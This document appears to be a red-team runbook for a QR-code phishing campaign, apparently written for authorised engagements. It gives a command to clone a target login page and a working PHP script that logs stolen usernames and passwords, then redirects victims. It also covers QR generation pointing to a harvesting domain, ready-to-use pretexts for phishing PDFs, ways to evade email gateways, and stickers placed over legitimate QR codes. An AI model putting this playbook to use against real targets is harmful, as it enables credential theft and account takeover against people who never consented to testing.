# Runbook: Quishing campaign

QR phishing delivers a credential harvesting URL as an image rather than a link, bypassing email
gateway URL inspection. The target scans the QR code with their phone, which redirects to a
harvesting page outside the corporate security stack. This playbook covers the full campaign from
infrastructure setup to PDF delivery.

## Objective

Deliver a credential harvesting URL to targets in a format that bypasses email link scanning,
capturing credentials on a mobile device outside endpoint management.

## Prerequisites

- A credential harvesting page. This can be an Evilginx2 lure (see the AiTM playbook) for
  full session capture, or a static HTML clone of the target login page if TOTP is not in scope.
- A domain for the harvesting infrastructure, aged and with a clean reputation (see the AiTM
  playbook for domain preparation notes).
- `qrencode` or equivalent for generating QR codes.
- A PDF template that provides a convincing pretext for the QR code.
- Delivery infrastructure.

## Harvesting page

If the objective is credential capture without MFA bypass, a static HTML clone of the target
login page hosted on your infrastructure is sufficient. Clone the target login page:

```bash
wget --mirror --convert-links --page-requisites --no-parent https://login.target.com/login
```

Edit the form action to POST credentials to your collection endpoint rather than to the
legitimate authentication server. A minimal PHP collection script:

```php
<?php
$data = date('Y-m-d H:i:s') . ' | ' . $_POST['username'] . ' | ' . $_POST['password'] . PHP_EOL;
file_put_contents('/var/log/harvest.log', $data, FILE_APPEND);
header('Location: https://login.target.com/');
exit;
```

The redirect to the real login page after capture means the target sees an authentication
failure and tries again on the real page. Many will assume they mistyped their password.

For full MFA bypass, use the Evilginx2 lure URL as the QR code destination instead.

## QR code generation

Install `qrencode`:

```bash
apt install qrencode
```

Generate the code:

```bash
qrencode -o qr.png -s 10 -m 2 'https://harvest.yourdomain.com/path'
```

The `-s 10` sets the pixel size per module and `-m 2` sets the quiet zone margin. For embedding
in a PDF, a size of at least 200x200 pixels is needed for reliable scanning. Test scan the
generated image before embedding it: verify it resolves to the intended URL and that the
harvesting page loads correctly on a mobile browser.

## PDF construction

The PDF needs a pretext that makes scanning the QR code feel routine. Effective formats include:

A document signing notification: "Please scan to review and sign the attached agreement before
the close of business." Document signing workflows (DocuSign, Adobe Sign, internal equivalents)
are common enough that this is unremarkable.

An IT security notice: "As part of our planned migration to multifactor authentication, please
scan the code below to re-enrol your credentials before [date]." Tie the date to a real upcoming
event at the target organisation if possible.

An expense or invoice approval: "Your approval is required for the attached items. Scan to
review and authorise." Finance teams receive these regularly.

Construct the PDF with the QR code embedded prominently, clear instructions to scan it, and
enough visual credibility (logo, consistent formatting, a plausible sender name and contact) to
pass a brief look. The quality threshold is lower than for email HTML, because people expect PDFs
to look slightly bland.

Tools for PDF construction: LibreOffice Writer with an embedded image, LaTeX, or any
layout application that can export to PDF.

## Delivery

Attach the PDF to a phishing email. The email itself contains no URL and no payload: it is a
clean message with a PDF attachment, which passes gateway inspection.

The email pretext should align with the PDF pretext. If the PDF is a document signing request,
the email should read like a document signing notification from the relevant system. Keep the
email short: a long email invites scrutiny.

Test delivery against a canary inbox before sending to the full target list. Verify that the
attachment is not stripped or flagged, that the email arrives in the inbox rather than spam, and
that scanning the QR code in the PDF reaches the harvesting page correctly.

## Monitoring

Set up logging on the harvesting endpoint to capture:

- Source IP and user agent on scan (confirms mobile device type and approximate location).
- Timestamp of each scan (useful for correlating with email delivery).
- Submitted credentials or captured session tokens.

A real-time notification (email or webhook to a messaging app) for each new capture avoids
missing short-lived sessions during the campaign window.

## Physical variant

For engagements with physical access scope, print QR code stickers on standard label paper.
A4 label sheets with 99x67mm labels are a convenient size for a QR code sticker that can be
placed over a legitimate code on a notice board, a meeting room booking display, or a visitor
Wi-Fi access card.

Test the sticker's scannability before placing it: label paper sometimes introduces a glare
that makes scanning unreliable at certain angles. A matte laminate improves this.

## Evidence collection

- Server logs showing scan events with timestamps and IP addresses.
- Screenshot of captured credentials or Evilginx2 session output.
- Copy of the PDF and QR code used.
- GoPhish delivery report showing which targets received and opened the email.

## Techniques

- [Quishing](../phishing/quishing.md) — QR code delivery mechanism, PDF embedding, and detection gaps
- [Credential harvesting via legitimate cloud services](../credentials/cloud-hosting.md) — hosting the harvesting page on trusted infrastructure

## Resources

- [qrencode](https://github.com/fukuchi/libqrencode)
- [GoPhish](https://getgophish.com/)
